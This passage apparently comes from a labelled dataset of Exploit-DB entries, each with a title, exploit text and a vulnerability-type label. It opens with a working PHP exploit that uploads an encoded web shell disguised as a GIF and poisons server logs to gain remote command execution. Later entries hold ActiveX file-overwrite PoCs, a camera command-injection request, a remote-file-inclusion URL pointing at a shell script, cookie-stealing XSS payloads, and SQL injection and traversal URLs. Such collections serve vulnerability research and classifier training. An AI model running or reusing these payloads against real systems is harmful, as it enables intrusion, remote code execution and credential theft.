""\x4d\x20\x53\x49\x54\x45\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77"". ""\x77\x77\x2e\x72\x61\x68\x69\x6d\x2e\x77\x65\x62\x64\x2e\x70\x6c"". ""\x2f\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x69\x6e\x69\x5f\x73"". ""\x65\x74\x28\x22\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f"". ""\x6e\x5f\x74\x69\x6d\x65\x22\x2c\x30\x29\x3b\x0d\x0a\x20\x0d\x0a"". ""\x20\x0d\x0a\x65\x63\x68\x6f\x20\x22\x48\x61\x75\x72\x75\x22\x3b"". ""\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x70\x61\x73\x73\x74\x68\x72\x75"". ""\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54\x54\x50\x5f\x48"". ""\x41\x55\x52\x55\x5d\x29\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x64"". ""\x69\x65\x3b\x3f\x3e\x0d\x0a\x20"";   $data.='-----------------------------7d6224c08dc Content-Disposition: form-data; name=""title""  hauru -----------------------------7d6224c08dc Content-Disposition: form-data; name=""userfile""; filename=""hauru.gif"" Content-Type: text/plain  '.$hauru.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""description""  DEVIL TEAM!! THE BEST POLISH HACKER TEAM -----------------------------7d6224c08dc Content-Disposition: form-data; name=""nname""  '.$username.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""email""  devilteam@polish.pl -----------------------------7d6224c08dc Content-Disposition: form-data; name=""homepage""  http://www.rahim.webd.pl/ -----------------------------7d6224c08dc Content-Disposition: form-data; name=""submit""  Add this file -----------------------------7d6224c08dc-- ';  echo ""upload hauru...\n""; echo ""secure categories must be off...\n""; $packet =""POST "".$p.""modules.php?op=modload&name=Downloads&file=index&req=AddDownload HTTP/1.0\r\n""; $packet.=""Cookie: MDPROSID="".$session."";\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);  echo ""Hauru uploaded!! now remote code execution...\n""; $packet =""GET "".$p.""error.php HTTP/1.1\r\n""; $packet.=""Cookie: MDPROSID="".$session."";\r\n""; $packet.=""Cookie: PNSVlang=../upload/dl/hauru.gif%00;\r\n""; $packet.=""HAURU: "".$cmd.""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacket($packet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); }  echo ""insert evil code in logfiles ...\r\n\r\n""; $calcifer = base64_decode(""PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuLi5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyBUbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+""); $packet=""GET "".$p.$calcifer."" HTTP/1.0\r\n""; $packet.=""User-Agent: "".$calcifer."" Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: close\r\n\r\n""; sendpacket($packet); sleep(1);   $paths= array ( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" );  for ($i=0; $i<=count($paths)-1; $i++) { $a=$i+2; echo ""["".$a.""] Check Path: "".$paths[$i].""\r\n""; echo ""remote code execution in logifiles...wait..\n""; $packet =""GET "".$p.""error.php HTTP/1.1\r\n""; $packet.=""Cookie: MDPROSID="".$session."";\r\n""; $packet.=""Cookie: PNSVlang=../"".$paths[$i].""%00;\r\n""; $packet.=""HAURU: "".$cmd.""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacket($packet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); } } echo ""Exploit err0r :(\n""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\n""; ?>  # milw0rm.com [2006-11-04]",Local File Inclusion,1
5496,"Watchfire Appscan 7.0 - ActiveX Multiple Insecure Methods **************************************************************************************************************** Multiple Insecure Methods in AppScan Watchfire Web Application Security v 7.0 Remote: Yes An arbitrary file overwrite has been discovered in an ActiveX control installed with the WatchFire Appscan v 7.0. by callAX -> Fr33d0m & Kn0wl3dg3 1s th3 r341 P0w3r ****************************************************************************************************************    <HTML>  <object id=ctrl classid=""clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\autoexec_.bat""    ctrl.CompactSave(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>   <HTML> <BODY>  <object id=ctrl classid=""clsid:{AA9730F1-70F6-43DC-94FC-000000000004}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\boot_.ini""    ctrl.saveRecordedExploreToFile(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>    <HTML> <BODY>  <object id=ctrl classid=""clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\ntldr_""    ctrl.SaveSession(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>  # milw0rm.com [2008-04-25]",file overwrite,1
42788,"FLIR Thermal Camera FC-S/PT - Command Injection FLIR Systems FLIR Thermal Camera FC-S/PT Authenticated OS Command Injection   Vendor: FLIR Systems, Inc. Product web page: http://www.flir.com Affected version: Firmware version: 8.0.0.64                   Software version: 10.0.2.43                   Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2                   FC-Series S (FC-334-NTSC)                   PT-Series (PT-334 200562)  Summary: Get the best image detail in challenging imaging environments with the FLIR FC-Series S thermal network camera. The award-winning FC-Series S camera sets the industry standard for high-quality thermal security cameras, ideal for perimeter protection applications. The FC-Series S is capable of replacing multiple visible cameras and any additional lighting and infrastructure needed to support them.  Desc: FLIR FC-S/PT series suffer from an authenticated OS command injection vulnerability. This can be exploited to inject and execute arbitrary shell commands as the root user.   Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le            Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082            Nexus Server/2.5.29.0            Nexus Server/2.5.14.0            Nexus Server/2.5.13.0            lighttpd/1.4.28            PHP/5.4.7   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2017-5437 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5437.php   23.03.2017  --   PoC request (sleep 17):  POST /page/maintenance/lanSettings/dns HTTP/1.1 Host: TARGET Content-Length: 64 Accept: */* Origin: http://TARGET X-Requested-With: XMLHttpRequest User-Agent: Testingus/1.0 Content-Type: application/x-www-form-urlencoded Referer: http://TARGET/maintenance Accept-Language: en-US,en;q=0.8,mk;q=0.6 Cookie: PHPSESSID=d1eabfdb8db4b95f92c12b8402abc03b Connection: close  dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D=8.8.4.4%60sleep%2017%60",Authenticated OS Command Injection,1
41737,"Disk Sorter Enterprise 9.5.12 - Local Buffer Overflow [+] Title: Disk Sorter Server v9.5.12 - Local Stack-based buffer overflow [+] Credits / Discovery: Nassim Asrir [+] Author Email: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/ [+] Author Company: Henceforth [+] CVE: N/A  Vendor: ===============  http://www.disksorter.com/      Download: ===========  http://www.disksorter.com/setups/disksortersrv_setup_v9.5.12.exe     Vulnerability Type: ===================  local stack-based buffer overflow   POC: ===================  Launch the program click on :  1 - Server   2 - Connect  3 - and in the Share Name field inject (5000 ""A"") then the program crashed see the picture.  CVE Reference: ===============  N/A     Tested on: ===============   Windows 7  Win xp",Local Stack-based buffer overflow,1
31926,GlassFish Application Server - '/resourceNode/jdbcResourceNew.jsf' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29751/info      Sun Glassfish is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.      An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.      http://[HOSTNAME]:4848/resourceNode/jdbcResourceNew.jsf?propertyForm%3ApropertyC ontentPage%3AtopButtons%3AnewButton=++OK++&propertyForm%3ApropertySheet%3Aproper tSectionTextField%3AjndiProp%3Ajnditext=<script>alert('xss');</script>&propertyF orm%3ApropertySheet%3ApropertSectionTextField%3ApoolNameProp%3APoolName=__CallFl owPool&propertyForm%3ApropertySheet%3ApropertSectionTextField%3AdescProp%3Adesc= <script>alert('xss3');</script>&propertyForm%3ApropertySheet%3ApropertSectionTex tField%3AstatusProp%3Asun_checkbox9=true&propertyForm%3AhelpKey=jdbcresourcenew. html&propertyForm_hidden=propertyForm_hidden&javax.faces.ViewState=j_id185%3Aj_i d201&com_sun_webui_util_FocusManager_focusElementId=propertyForm%3ApropertyConte ntPage%3AtopButtons%3AnewButton,Cross-Site Scripting,1
26959,"Papoo 2.1.2 - 'index.php?menuid' SQL Injection source: https://www.securityfocus.com/bid/16020/info  Papoo is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  These issues affect version 2.1.2; other versions may also be vulnerable.   http://www.example.com/index.php?menuid=[SQL]",SQL Injection,1
20972,"Icecast 1.1.x/1.3.x - Directory Traversal source: https://www.securityfocus.com/bid/2932/info  Icecast is an open source audio-streaming server for both Unix and Microsoft Windows systems.  Icecast does not filter encoded characters from URLs when receiving web requests. If a remote attacker crafts a URL containing the ASCII equivalent of directory traversal characters, it is possible to escape Icecast's ""root"" directory. This will allow the attacker to view files readable by the ownership and group membership of the icecast server.   Mp3-files residing outside the Web catalog can be accessed by replacing ascii-values for each ""."", thus using ""/%2E%2E/"" instead of ""/../"" will walk one folder downward.  Place a mp3-file named ""test1.mp3"" in the directory below the one you specified in the variable ""staticdir"".  Then write the following in your browser:  http://localhost:8000/file/../test1.mp3 - Will fail in getting the file  http://localhost:8000/file/%2E%2E/test1.mp3 - Will succeed in getting the file",Directory Traversal,1
30638,"GForge 4.6/4.5/3.1 - 'Verify.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/25923/info  GForge is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data. A fix is available from the vendor.  Exploiting this issue could allow an attacker to steal cookie-based authentication credentials and to launch other attacks.  This issue affects GForge 4.6; other versions may also be affected.   http://www.example.com/GForgePath/account/verify.php?confirm_hash=""/><p>This must not happen</p>",Cross-Site Scripting,1
31895,"Notepad++ CCompletion Plugin 1.19 - Local Stack Buffer Overflow Application:Notepad++ Version:6.5.2 UNICODE Get the application from: http://notepad-plus-plus.org/download/v6.5.2.html  Plugin:CCompletion Version: Version 1.19 ( Unicode ) Get the plugin from: http://sourceforge.net/apps/mediawiki/notepad-plus/index.php?title=Plugin_Central  Vulnerability:Stack buffer overflow Vulnerability Impact: Local Code Execution  Triggering details: 1.	Install Notepad++ (6.5.2) with the plugin CCompletion(Version 1.19 UNICODE) 2.	Open Notepad++ 3.	Input large number of characters (any character is ok), at least 554 characters. 4.	Select all the text in the editor 5.	Click Menu Plugins->CCompletion->Go to identifier (Open in firt view) F11, then the Notepad++ will be crashed   Cause of the Vulnerability The notepad++ sends text the user selected to the plugin of CCompletion, but the plugin copys the text by using lstrcpyW in the module kernel32. So the stack buffer is over flow.  Exploit POC I constructed an exploit for this vulnerability. It will show a message box with the caption “HA” and the text “Back Door Opend.” 1.	This exploit does not process the mitigation of DEP, so if you want to test it please disable the DEP feature on your system or just for the application. 2.	This exploit uses the “JMP ESP” insturction in module Notepad++.exe, because it is a non-ASLR module.So the expolit is independent of Windows system version.  The expolit is in the file attatchment named shellcode.txt  1．	Open shellcode.txt with Notepad++ 2．	Select all the content in the editor 3．	Click Menu Plugins->CCompletion->Go to identifier (Open in firt view) F11  Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31895.7z",Local Stack Buffer Overflow,1
2256,"Integramod Portal 2.0 rc2 - 'phpbb_root_path' Remote File Inclusion ##################################### matasanos ################################### # Integramod Portal 2.x File Inclusion Vulnerabilities # #   affected software: Integramod Portal #   vendor: Integramod . you can donwload it from http://www.integramod.com #   level: Highly Critical (muy critico) #  # ####################################################################################  # # #   http://[target]/[patch]/includes/functions_mod_user.php?phpbb_root_path=http://url--ataca.org/shell.txt? # #   http://[target]/[patch]/includes/functions.php?phpbb_root_path=http://url--ataca.org/shell.txt? # # #################################################################################### # #                                 found by MATASANOS                               # # # # #         recuerdos a antrax,freak,piker,vampi,pennismen,hombre-cola,groxo         #  # milw0rm.com [2006-08-25]",Remote File Inclusion,1
43849,"Shopware 5.2.5/5.3 - Cross-Site Scripting Document Title: =============== Shopware 5.2.5 & v5.3 - Multiple Cross Site Scripting Web Vulnerabilities   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1922  Shopware Security Tracking ID: SW-19834  Security Update:  http://community.shopware.com/Downloads_cat_448.html#5.3.4 http://community.shopware.com/_detail_2035.html  http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-15374  CVE-ID: ======= CVE-2017-15374   Release Date: ============= 2017-09-05   Vulnerability Laboratory ID (VL-ID): ==================================== 1922   Common Vulnerability Scoring System: ==================================== 4.4   Vulnerability Class: ==================== Cross Site Scripting - Persistent   Current Estimated Price: ======================== 1.000€ - 2.000€   Product & Service Introduction: =============================== Shopware is a modular online shop system that is since 2004 developed in germany. It is available both as  an open source software as well as in commercial editions. The program can be extended in its functions by  installing additional plugins. An open API allows third-party systems, such as payment services or ERP  systems, to be connected. The system is multi shop capable it can thus be generated within an installation  several shops in different domains. A multi-client capability (complete separation of multishops in the  administration area) is by default, but can be achieved in the cluster.  (Copy of the Vendor Homepage: https://en.shopware.com/ )   Abstract Advisory Information: ============================== The vulnerability laboratory core research team discovered multiple stored cross site scripting vulnerability in the official Shopware v5.2.5 & 5.3 CMS.   Vulnerability Disclosure Timeline: ================================== 2016-10-07: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH) 2016-10-08: Vendor Notification (Shopware Security Team) 2016-**-**: Vendor Response/Feedback (Shopware Security Team) 2017-**-**: Vendor Fix/Patch (Shopware Service Developer Team) 2017-09-05: Public Disclosure (Vulnerability Laboratory) 2017-10-25: Security Acknowledgements (Shopware Developer Team) 2017-10-25: Security Acknowledgements (Shopware Security Team)   Discovery Status: ================= Published   Affected Product(s): ==================== Shopware AG Product: Shopware - Content Management System (Web-Application) 5.2.5  Shopware AG Product: Shopware - Content Management System (Web-Application) 5.3   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ The shopware v5.2.5 - v5.3 is vulnerable to cross site scripting in the customer and order section of the content management  system backend modules. Remote attackers are able to inject malicious script code to the firstname, lastname or order  input fields to provoke a persistent execution in the customer and orders section of the backend. The execution occurs  in the shopware administrator backend listing when processing to preview the customers (kunden) or orders (bestellungen). The injection can be processed by interaction via user registration or by manipulation of the order information inputs. The web issue can be exploited by low privileged user accounts against higher privileged admin- oder moderator-accounts.  The security risk of the bugs are estimated as medium with a cvss (common vulnerability scoring system) count of 4.4.  Exploitation of the issue requires a low privileged web-application user account and low or medium user interaction.  Successful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent  external redirect to malicious sources and application-side manipulation of affected or connected module context.  Request Method(s): [+] POST (Registration) [+] POST (Order Item) [+] POST (Profile Update)  Vulnerable Input(s): [+] Firstname [+] Lastname [+] Order Name  Affected Module(s): [+] Kunden (Customers) [+] Bestellungen (Orders)   Proof of Concept (PoC): ======================= The cross site vulnerabilities can be exploited by remote attackers with low privileged shopware user account and low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   Manual steps to reproduce the vulnerability ... 1.  Open the the browser and surf to the target shopware v5.2.5 web-application 2.  Move to the registration formular 3.  Include a script code payload with a iframe src onload tag to the firstname, lastname and name parameters 4.  Submit the request via POST method to register the account 5.  Move to the inbox and verify via link the account to activate Note: Now the payloads are executable saved to the Kunden (Customer) section in the backend 6.  The administrator visits in the next step the Kunden (Customer) section to preview 7.  The script code payload executes in the customers list 8.  As next step the attacker places an order via shop Note: The order name manipulation via registration is as well able to execute script code the context 9.  The administrator visits in the next step the Bestellungen (orders) section to preview  10. The script code payload executes in the orders list 11. Successful reproduce of the both cross site vulnerabilities!  Note: Attackers are able to inject malicious redirects, frames with payloads or other script code tags. The basic web validation filter of the shopware content management system does not encode the list context.   PoC: Vulnerable Source (Execution in Orders - Bestellungen) <tr class=""x-grid-row  x-grid-row-alt""><td class="" x-grid-cell x-grid-cell-gridcolumn-1496   x-grid-cell-special x-grid-cell-row-checker x-grid-cell-first""><div class=""x-grid-cell-inner ""  style=""text-align: left; ;""><div class=""x-grid-row-checker"">&nbsp;</div></div></td><td class=""  x-grid-cell x-grid-cell-gridcolumn-1428   ""><div class=""x-grid-cell-inner "" style=""text-align: left;  ;"">20.08.2016 08:34</div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1429    ""><div class=""x-grid-cell-inner "" style=""text-align: left; ;"">20044</div></td><td class=""  x-grid-cell x-grid-cell-gridcolumn-1430   ""><div class=""x-grid-cell-inner "" style=""text-align: left; ;""> 536,80</div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1431   ""><div class=""x-grid-cell-inner ""  style=""text-align: left; ;"">&nbsp;</div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1432   ""> <div class=""x-grid-cell-inner "" style=""text-align: left; ;"">Rechnung</div></td><td class="" x-grid-cell  x-grid-cell-gridcolumn-1433   ""><div class=""x-grid-cell-inner "" style=""text-align: left; ;"">Standard Versand</div></td> <td class="" x-grid-cell x-grid-cell-gridcolumn-1434   ""><div class=""x-grid-cell-inner "" style=""text-align: left; ;""> Hauptshop Deutsch</div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1435   ""><div class=""x-grid-cell-inner ""  style=""text-align: left; ;"">Mar'Da>""<iframe src=""evil.source"" onload=""alert(""PTEST"")[PERSISTENT SCRIPT CODE EXECUTION!]"" <=""""  korat="""">""<iframe src=evil.source onload=alert(""PTEST"")[PERSISTENT SCRIPT CODE EXECUTION!] <</div></td><td class="" x-grid-cell  x-grid-cell-gridcolumn-1436 "" ><div  class=""x-grid-cell-inner "" style=""text-align: left; ;""><a href=""mailto:mardakorat@cuvox.de""  data-qtip=""mardakorat@cuvox.de"">mardakorat@cuvox.de</a></div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1437    "" ><div  class=""x-grid-cell-inner "" style=""text-align: left; ;"">Offen</div></td><td class="" x-grid-cell  x-grid-cell-gridcolumn-1438   "" ><div  class=""x-grid-cell-inner "" style=""text-align: left; ;"">Offen</div></td> <td class="" x-grid-cell x-grid-cell-actioncolumn-1405   x-action-col-cell x-grid-cell-last"" > <div  class=""x-grid-cell-inner "" style=""text-align: left; ;""> <img alt="""" src=""data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==""  class=""x-action-col-icon x-action-col-0  sprite-user "" data-qtip=""Kunde öffnen"" data-action=""openCustomer""  /> <img alt="""" src=""data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==""  class=""x-action-col-icon x-action-col-1  sprite-minus-circle-frame "" data-qtip=""Bestellung löschen""  data-action=""deleteOrder""  /><img alt="""" src=""data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==""  class=""x-action-col-icon x-action-col-2  sprite-pencil "" data-qtip=""Zeige Details"" data-action=""editOrder""  /></div></td></tr> <tr class=""x-grid-row "" ><td class="" x-grid-cell x-grid-cell-gridcolumn-1496  x-grid-cell-special  x-grid-cell-row-checker x-grid-cell-first"" ><div  class=""x-grid-cell-inner "" style=""text-align: left; ;""> <div class=""x-grid-row-checker"">&#160;</div></div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1428   "" > <div  class=""x-grid-cell-inner "" style=""text-align: left; ;"">19.08.2016 15:50</div></td><td class="" x-grid-cell  x-grid-cell-gridcolumn-1429   "" ><div  class=""x-grid-cell-inner "" style=""text-align: left; ;"">20051</div></td> <td class="" x-grid-cell x-grid-cell-gridcolumn-1430   "" ><div  class=""x-grid-cell-inner ""  style=""text-align: left; ;"">308,75</div></td><td class="" x-grid-cell x-grid-cell-gridcolumn-1431   "" > <div  class=""x-grid-cell-inner "" style=""text-align: left; ;"">&#160;</div></td>   PoC: Vulnerable Source (Execution in Customers - Kunden) <div class=""x-window x-customer-detail-window x-layer x-window-default x-closable x-window-closable x-window-default-closable""  style=""left: 124px; top: 26px; width: 1093px; height: 458px; z-index: 39041;"" id=""customer-detail-window-2311"" tabindex=""-1""> <div style=""-moz-user-select: none; left: -1px; top: -1px; width: 1093px;"" class=""x-window-header x-window-header-draggable  x-docked x-window-header-default x-horizontal x-window-header-horizontal x-window-header-default-horizontal x-top  x-window-header-top x-window-header-default-top x-docked-top x-window-header-docked-top x-window-header-default-docked-top  x-unselectable"" id=""customer-detail-window-2311_header""><div style=""width: 1091px;"" id=""customer-detail-window-2311_header-body""  class=""x-window-header-body x-window-header-body-default x-window-header-body-horizontal x-window-header-body-default-horizontal  x-window-header-body-top x-window-header-body-default-top x-window-header-body-docked-top x-window-header-body-default-docked-top  x-window-header-body-default-horizontal x-window-header-body-default-top x-window-header-body-default-docked-top x-box-layout-ct""> <div style=""width: 1066px; height: 154px;"" id=""customer-detail-window-2311_header-innerCt"" class=""x-box-inner ""  role=""presentation""><div id=""customer-detail-window-2311_header-targetEl"" style=""position:absolute;width:20000px; left:0px;top:0px;height:1px""><div class=""x-component x-window-header-text-container x-box-item x-component-default""  style=""text-align: left; left: 0px; top: 0px; margin: 0px; width: 1049px;"" id=""customer-detail-window-2311_header_hd""> <span id=""customer-detail-window-2311_header_hd-textEl"" class=""x-window-header-text x-window-header-text-default""> Kundenkonto: Mar'Da""><iframe src=""evil.source"" onload=""alert(""PTEST"")[PERSISTENT SCRIPT CODE EXECUTION!]"" <=""""  korat""=""""><iframe src=evil.source onload=alert(""PTEST"")[PERSISTENT SCRIPT CODE EXECUTION!] < (20019)</iframe></span></div> <div class=""x-tool x-box-item x-tool-default"" style=""width: 15px; height: 15px; left: 1051px; top: 70px; margin: 0px;"" id=""tool-2312""> <img id=""tool-2312-toolEl"" src=""data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==""  class=""x-tool-close"" role=""presentation""></div></div></div></div>   --- PoC Session Logs [POST] --- Status: 200[OK] POST http://shopware.localhost:8080/backend/customer/save?_dc=1471541475086&customerID=22  Mime Type[application/json]    Request Header:       Host[shopware.localhost:8080]       User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]       Content-Type[application/json]       X-Requested-With[XMLHttpRequest]       Referer[http://shopware.localhost:8080/backend/]       Cookie[SHOPWAREBACKEND=fv4u2kg63p3ff3ht6kd6var803; test; x-ua-device=desktop; session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;] Connection[keep-alive] POST-Daten: {""id"":22,""groupKey"":""EK"",""email"":""TEST@TEST.de"",""active"":true,""accountMode"":0,""confirmationKey"": """",""paymentId"":5,""firstLogin"":""2016-08-18T00:00:00"",""lastLogin"":""2016-08-18T17:22:23"",""newsletter"":0,""validation"":0,"" languageId"":1,""shopId"":1,""priceGroupId"":0, ""internalComment"":""TEST-comment"",""failedLogins"":0,""referer"":"""",""default_billing_address_id"":22,"" default_shipping_address_id"":22, ""newPassword"":"""",""amount"":402.9,""orderCount"":1,""canceledOrderAmount"": 0,""shopName"":""Hauptshop Deutsch"",""language"":""Deutsch"",""birthday"":""16.05.1985"",""title"":"""","" salutation"":""mr"",""firstname"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source onload=alert(document.cookie) <"","" lastname"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source onload=alert(document.cookie) <"", ""number"":""20028"",""billing"":[{""id"":22,""salutation"":""mr"",""company"":"""","" department"":"""",""firstName"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source onload=alert (document.cookie) <"",""title"":"""",""lastName"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source onload=alert(document.cookie) <"", ""street"":""Teststrau00dfe"",""zipCode"":""72202"",""city"":""Nagold"",""additionalAddressLine1"":"""",""additionalAddressLine2"":"""", ""salutationSnippet"":""Herr"",""countryId"":2,""number"":"""",""phone"":"""",""vat Id"":"""",""stateId"":null}],""shipping"":[{""id"":23,""salutation"":""mr"",""company"":"""",""department"":"""", ""firstName"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source  onload=alert(document.cookie) <"",""title"":"""", ""lastName"":""TEST[INJECTED SCRIPT CODE]>""<iframe src=./evi.source onload=alert(document.cookie) <"", ""street"":""Teststrau00dfe"",""zipCode"":""72202"",""city"":""Nagold"",""additionalAddressLine1"":"""", ""additionalAddressLine2"":"""",""salutationSnippet"":""Herr"",""countryId"":2,""stateId"":null}],""debit"": [],""paymentData"":[{""accountNumber"":"""",""bankCode"":"""",""bankName"":"""",""accountHolder"":"""",""bic"":"""", ""iban"":"""",""useBillingData"":false,""id"":null}]}]    Response Header:       Server[nginx/1.8.1]       Content-Type[application/json]       Connection[keep-alive]       Set-Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; path=/backend/; HttpOnly] - Status: 200[OK] POST http://shopware.localhost:8080/backend/Log/createLog Mime Type [application/json]    Request Header:       Host[shopware.localhost:8080]       User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]       Content-Type[application/x-www-form-urlencoded; charset=UTF-8]       X-Requested-With[XMLHttpRequest]       Referer[http://shopware.localhost:8080/backend/]       Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; test; x-ua-device=desktop;  	session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]       Connection[keep-alive]    POST-Daten:       type[backend]       key[Kunden]       text[Kunde%2020028%20wurde%20gespeichert]       user[Demo-Admin]       value4[]    Response Header:       Server[nginx/1.8.1]       Content-Type[application/json]       Connection[keep-alive]       Set-Cookie[SHOPWAREBACKEND=hmb3lqokn3bkr6kvpo1o6vi4o6; path=/backend/; HttpOnly] - Status: 200[OK] GET http://shopware.localhost:8080/backend/evil.source[PERSISTENT SCRIPT CODE EXECUTE!]  Mime Type[text/html]    Request Header:       Host[shopware.localhost:8080]       User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]       Referer[http://shopware.localhost:8080/backend/]       Cookie[SHOPWAREBACKEND=p56ursgfdc6f1tbh0s35detvc5; test; x-ua-device=desktop;  	session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]       Connection[keep-alive]    Response Header:       Server[nginx/1.8.1]       Content-Type[text/html; charset=UTF-8]       Connection[keep-alive]       